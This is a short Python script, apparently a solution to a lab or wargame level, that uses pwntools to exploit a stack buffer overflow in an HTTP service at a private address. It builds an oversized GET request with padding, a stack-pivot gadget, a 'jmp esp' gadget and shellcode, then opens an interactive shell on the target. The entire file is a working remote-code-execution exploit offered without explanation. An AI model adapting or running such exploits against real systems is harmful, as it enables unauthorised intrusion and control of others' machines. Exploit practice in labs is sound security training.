#!/usr/bin/env python3
 
from pwn import *
 
io = remote("192.168.132.133", 20001)
 
payload  = b"GET /" + b"A"*127 # fill the 'resolved' variable
payload += b"B"*12
payload += p32(0x0804905f) # add esp, 0x230; pop ebx; pop edi; pop ebp; ret
payload += b" HTTP/1.1"
payload += b"C"*379 # junk data to accomodate the "add esp, 0x230" instruction
payload += b"D"*12 # junk data for the subsequent "pop" instructions
payload += p32(0x08049f4f) # jmp esp
payload += asm(shellcraft.sh())
 
io.sendline(payload)
io.interactive()
